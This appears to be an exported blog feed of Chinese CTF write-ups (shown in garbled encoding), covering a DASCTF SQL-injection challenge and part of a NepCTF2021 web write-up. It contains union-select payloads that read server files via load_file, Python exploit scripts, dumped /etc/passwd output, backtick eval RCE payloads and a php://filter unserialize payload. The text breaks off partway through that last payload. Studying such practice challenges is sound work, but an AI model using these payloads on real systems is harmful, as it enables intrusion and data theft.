user==========>'root'@'localhost'</span></code></pre><p>è‚¯å®šæœ‰æƒé™äº†ï¼Œè¯»äº†<code>index.php</code>å’Œ<code>dbConnect.php</code>ï¼Œç»™å¤ç°çš„å¸ˆå‚…å‚è€ƒ</p><pre class="language-php" data-language="php"><code class="language-php">// index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token single-quoted-string string">'dbConnect.php'</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">' '</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\''</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'delete'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'drop'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'update'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token variable">$item</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/i"</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Forbidden!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT * FROM users WHERE id = '<span class="token interpolation"><span class="token variable">$query</span></span>' OR username = \"<span class="token interpolation"><span class="token variable">$query</span></span>\""</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>&lt;tr>&lt;th>ID&lt;/th>&lt;th>UserName&lt;/th>&lt;/tr>"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;tr>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;/tr>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/table>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">// dbConnect.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$serve</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'users'</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mysqli</span><span class="token punctuation">(</span><span class="token variable">$serve</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'connect error:'</span><span class="token punctuation">.</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_errno</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set_charset</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è®¾ç½®æ•°æ®åº“å­—ç¬¦é›†</span></span></code></pre><p>è¯»å–æ ¹ç›®å½•ä¸‹flagï¼Œç”±äºbanäº†<code>flag</code>ï¼Œè½¬åå…­è¿›åˆ¶å³å¯</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,hex(load_file(0x2f666c6167)),3"</span></code></pre><p><code>hex(&#39;/flag&#39;)==&#39;0x2f666c6167&#39;</code></p><p>ç»“æŸäº†</p><p>é™„ä¸Šå°è„šæœ¬ï¼Œè™½ç„¶æ²¡å•¥ç”¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3æœˆ 27, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://ea4d13de-db0a-41e5-b303-a843bd51a27b.machine.dasctf.com/?query="</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"Forbidden"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Forbidden"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"right"</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,database(),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># databases==========>users</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select group_concat(table_name) from information_schema.tables where table_schema like database()),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># tables==========>f1agdas,users</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select `2` from (select 1,2 union select * from f1agdas limit 1,1)a),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># flag.columns==========>flag.txt</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,hex(load_file(0x2f666c6167)),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># database()</span>    <span class="token comment"># table()</span>    <span class="token comment"># columns()</span>    data<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><p>ä»¥ä¸‹æ˜¯æœ¬äººçš„ç¢ç¢å¿µå’Œåæ€ï¼Œå¸ˆå‚…ä»¬å¯ä»¥è·³è¿‡æƒ¹</p><p>ç»éªŒä¸è¶³ï¼Œæœ€åè¿˜æ˜¯æ²¡èƒ½å‡ºè¿™ç®€å•é¢˜ã€‚ä¸€æ–¹é¢ä¹Ÿæ˜¯å¹³å°çš„é—®é¢˜ï¼Œå®åœ¨å¤ªå¡äº†:(</p><p>æ•°æ®åº“é‡Œå†™çš„<code>flag.txt</code>ï¼Œæœ€åå´åœ¨æ ¹ç›®å½•<code>/flag</code>ã€‚å°è¯•è¿‡åå…­è¿›åˆ¶<code>/flag</code>è¯»å–ï¼Œå¯èƒ½æ˜¯å› ä¸ºå¤ªå¡äº†ï¼Œæ²¡æˆåŠŸå°±æ²¡å†è¯•äº†ï¼Œä»¥ä¸ºå°±æ˜¯<code>flag.txt</code>ã€‚ç›²çŒœæœ‰äººæ‹¿åˆ°æ³¨å…¥é¢˜ç›´æ¥sqlmapå¼€å§‹è·‘ï¼ˆå› ä¸ºä¹‹å‰æˆ‘ä¹Ÿå¹²è¿‡ï¼‰ï¼Œå¯¼è‡´æœåŠ¡å™¨è´Ÿè½½å¤ªå¤§ï¼Œæˆ–è€…è¯´è¿ç»´å»ä¸‰äºšäº†2333</p><p>è¿˜å°è¯•äº†è¯»å–ä¸€å †æ— ç”¨çš„ä¸œè¥¿ï¼Œä»¥ä¸ºå’Œ <a href="/article/Buuoj-WEB-Write-up/#Comment">[ç½‘é¼æ¯ 2018]Comment</a> ä¸€æ ·</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># @@datadir</span><span class="token comment"># /var/lib/mysql/</span><span class="token comment"># @@basedir</span><span class="token comment"># /usr/</span><span class="token comment"># /etc/host</span><span class="token comment"># 127.0.0.1localhost</span><span class="token comment"># ::1localhost ip6-localhost ip6-loopback</span><span class="token comment"># fe00::0ip6-localnet</span><span class="token comment"># ff00::0ip6-mcastprefix</span><span class="token comment"># ff02::1ip6-allnodes</span><span class="token comment"># ff02::2ip6-allrouters</span><span class="token comment"># 192.168.0.1149fa7a3d75b4f</span><span class="token comment"># /etc/passwd</span><span class="token comment"># root:x:0:0:root:/root:/bin/bash</span><span class="token comment"># daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><span class="token comment"># bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><span class="token comment"># sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><span class="token comment"># sync:x:4:65534:sync:/bin:/bin/sync</span><span class="token comment"># games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><span class="token comment"># man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><span class="token comment"># lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><span class="token comment"># mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><span class="token comment"># news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><span class="token comment"># uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><span class="token comment"># proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><span class="token comment"># www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><span class="token comment"># backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><span class="token comment"># list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><span class="token comment"># irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><span class="token comment"># gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><span class="token comment"># nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><span class="token comment"># _apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><span class="token comment"># mysql:x:101:101:MySQL Server,,,:/var/lib/mysql/:/bin/false</span></code></pre><p>æ²¡æœ‰çº¿ç´¢ï¼Œç›²çŒœè¯»äº†ä¸ª<code>start.sh</code></p><pre class="language-sh" data-language="sh"><code class="language-sh">#!&#x2F;bin&#x2F;bashrm -rf &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock.lockrm -rf &#x2F;tmp&#x2F;mysql.sockusermod -d &#x2F;var&#x2F;lib&#x2F;mysql&#x2F; mysqlln -s &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql.sock &#x2F;tmp&#x2F;mysql.sockchown -R mysql:mysql &#x2F;var&#x2F;lib&#x2F;mysqlmysqld_safe &amp;mysql_ready() &#123;mysqladmin ping --socket&#x3D;&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock --user&#x3D;root --password&#x3D;root &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1&#125;while !(mysql_ready)doecho &quot;waiting for mysql ...&quot;sleep 3donemysql -e &quot;ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;root&#39;;flush privileges;&quot; -uroot -prootif [[ -f &#x2F;db.sql ]]; then    mysql -e &quot;source &#x2F;db.sql&quot; -uroot -proot    rm -f &#x2F;db.sqlfiif [[ -f &#x2F;flag.sh ]]; thensource &#x2F;flag.shfiapache2-foreground</code></pre><p>ç„¶åå¼€å§‹çˆ†<code>/proc/[id]/fd/[id]</code>ä¸€å»ä¸å¤è¿”äº†ã€‚å¹³å°å¼„å¡ä¹Ÿæœ‰æˆ‘çš„ä¸€ä»½ï½</p><p>ç”šè‡³è¿˜è¯»äº†apacheé…ç½®æ–‡ä»¶ç­‰ç­‰ç­‰ï¼Œå®åœ¨æ˜¯ç»éªŒä¸è¶³ï¼Œè¿˜æ˜¯æœ¬äººå¤ªèœäº†2333</p><p>åšä¸ªåæ€å§ï¼Œä¹Ÿè®¸å“ªå¤©ç¾è€»å¿ƒçˆ†å‘è¿™æ®µå°±ç»™æˆ‘åˆ äº†ã€‚</p><p>å†™ç»™ä»–äººæ˜é‰´ï¼Œå†™ç»™è‡ªå·±åæ€ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆç¬”è®° </category>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2021</title>
      <link href="article/Nepctf2021/"/>
      <url>article/Nepctf2021/</url>
      
        <content type="html"><![CDATA[<p>é˜Ÿä¼åç§°ï¼šErr0r</p><a id="more"></a><p>é˜Ÿä¼æƒ…å†µï¼š</p><img src="/article/Nepctf2021/image-20210322130933265.png" class="" title="rank" loading="lazy"><p>è™½ç„¶å¹³å°å…«å¤ªè¡Œï¼Œä½†æ˜¯éƒ¨åˆ†é¢˜ç›®è´¨é‡å¾ˆé«˜ï¼Œæœ¬èœé¸¡çˆ¬äº†ï¼Œè™šå¿ƒå­¦ä¹ ã€‚</p><p>æœ¬Wpä¾§é‡äºæ€è·¯è®°å½•ï¼Œå¤§ä½¬ä»¬è½»å–·â€¦</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><h4 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span>`cat`<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span>`<span class="token operator">*</span><span class="token operator">></span>a`<span class="token punctuation">;</span>è®¿é—®<span class="token punctuation">.</span><span class="token operator">/</span>a</code></pre><h4 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h4><p>æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$nep</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nep'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'too long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>éå¸¸ç®€æ´ï¼Œä¼ å…¥ä¸¤ä¸ªå‚æ•°ç„¶å<code>eval</code>æ‰§è¡Œï¼Œæ ¼å¼ä¸º</p><pre class="language-none"><code class="language-none">.&#x2F;?nep&#x3D;&#96;payload&#96;;&amp;len&#x3D;n</code></pre><p>åˆ©ç”¨`åå¼•å·å’Œåˆ†å·;æ‰§è¡Œå‘½ä»¤</p><p>é¦–å…ˆçœ‹åˆ°<code>len</code>ç”¨æ¥æˆªæ–­å­—ç¬¦ä¸²<code>nep</code>ï¼Œè€Œifä¸­<code>intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13</code>å³é•¿åº¦ä¸ç›¸ç­‰ï¼Œåˆšå¼€å§‹ä»¥ä¸ºéœ€è¦åˆ©ç”¨æ•´å½¢æº¢å‡º</p><blockquote><p>Intvalæœ€å¤§çš„å€¼å–å†³äºæ“ä½œç³»ç»Ÿã€‚ 32 ä½ç³»ç»Ÿæœ€å¤§å¸¦ç¬¦å·çš„ integer èŒƒå›´æ˜¯ -2147483648 åˆ° 2147483647ã€‚ä¸¾ä¾‹ï¼Œåœ¨è¿™æ ·çš„ç³»ç»Ÿä¸Šï¼Œ intval(â€˜1000000000000â€™) ä¼šè¿”å› 2147483647ã€‚64 ä½ç³»ç»Ÿä¸Šï¼Œæœ€å¤§å¸¦ç¬¦å·çš„ integer å€¼æ˜¯ 9223372036854775807ã€‚</p></blockquote><p>æµ‹è¯•äº†ä¸€ä¸‹å‘ç°ä¸å¯¹ï¼Œä¼ å…¥å­—ç¬¦ä¸²è§†ä¸º<strong>å­—ç¬¦ä¸²ç±»å‹</strong>ï¼Œå¹¶ä¸å­˜åœ¨æ•´å½¢æº¢å‡ºï¼Œå¦‚ä¸‹</p><img src="/article/Nepctf2021/image-20210322140444729.png" class="" title="intval" loading="lazy"><p>æ‰€ä»¥æ€è·¯ä¸å¯¹ï¼Œæ¥ä¸‹æ¥æƒ³åˆ°å››å­—ç¬¦RCEï¼Œ<a href="https://blog.csdn.net/q20010619/article/details/109206728">å‚è€ƒæ–‡ç« </a>ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ï¼Œé—®é¢˜æ˜¯æµ‹è¯•ä¸‹æ¥ç›®å½•éå¸¸çš„æ‚ä¹±</p><p>flagå°±åœ¨å½“å‰ç›®å½•ï¼Œæ— æ³•å‡†ç¡®ç›´æ¥catã€‚<strong>æ­¤è„šæœ¬æ— æ•ˆï¼Œä»¥å‰çš„è„šæœ¬ç›´æ¥ç”¨ï¼Œä»…å±•ç¤º</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3æœˆ 20, 2021"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:10001/nep2021/little_trick/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?len=7&amp;nep="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'>dir'</span><span class="token punctuation">,</span> <span class="token string">'>f\>'</span><span class="token punctuation">,</span> <span class="token string">'>kt-'</span><span class="token punctuation">,</span> <span class="token string">'>sl'</span><span class="token punctuation">,</span> <span class="token string">'*>v'</span><span class="token punctuation">,</span> <span class="token string">'>rev'</span><span class="token punctuation">,</span> <span class="token string">'*v>b'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload0<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'`;'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        å¾…ç»­</code></pre><p>è®¿é—®ä¸‹vï¼Œç»“æœä»…èƒ½æ‰«åˆ°ç›®å½•</p><img src="/article/Nepctf2021/image-20210322142144631.png" class="" title="list" loading="lazy"><p>ç›®å½•å˜å¾—éå¸¸ä¹±ï¼Œäºæ˜¯æƒ³ä¸ºä½•ä¸èƒ½åˆ©ç”¨<code>*</code>ç›´æ¥è¯»æ–‡ä»¶å‘¢</p><blockquote><p>è¾“å…¥ç»Ÿé…ç¬¦* ï¼ŒLinuxä¼šæŠŠç¬¬ä¸€ä¸ªåˆ—å‡ºçš„æ–‡ä»¶åå½“ä½œå‘½ä»¤ï¼Œå‰©ä¸‹çš„æ–‡ä»¶åå½“ä½œå‚æ•°</p></blockquote><p>æµ‹è¯•å¦‚ä¸‹</p><img src="/article/Nepctf2021/image-20210322143017075.png" class="" title="test" loading="lazy"><p>æµ‹è¯•å¯è¡Œï¼Œè¾“å‡ºä¸€ä¸ª<code>cat</code>æ–‡ä»¶ï¼Œç„¶åç›®å½•å°±æœ‰<code>cat</code>/<code>index.php</code>/<code>nepctf.php</code>äº†ï¼Œç„¶åæ‰§è¡Œ<code>*&gt;a</code>ï¼Œå³å°†ç›®å½•å†…å®¹å½“ä½œå‘½ä»¤æ‰§è¡Œè¾“å‡ºåˆ°æ–‡ä»¶aï¼Œcatå…¨éƒ¨æ–‡ä»¶ï¼Œç„¶åè®¿é—®æ–‡ä»¶aå³å¯</p><img src="/article/Nepctf2021/image-20210322144032886.png" class="" title="image-20210322144032886" loading="lazy"><hr><h3 id="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"><a href="#æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­" class="headerlink" title="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"></a>æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­</h3><h4 id="payloadï¼š-1"><a href="#payloadï¼š-1" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h4><pre class="language-none"><code class="language-none">è¯»å–shell.phpï¼š.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30&#x3D;---åˆ 